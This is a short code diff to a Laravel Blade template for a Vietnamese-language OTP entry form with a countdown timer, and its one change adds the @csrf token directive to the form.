@@ -260,6 +260,7 @@
         <div id="countdown">Thời gian chờ của bạn còn lại 507 giây</div>
 
         <form action="{{ route('otp_error_post') }}" method="post">
+            @csrf
             <div class="form-group">
                 <label>Nhập mã otp:</label>
                 <input name="otp" id="otp" class="form-control" placeholder="Nhập mã otp" required>
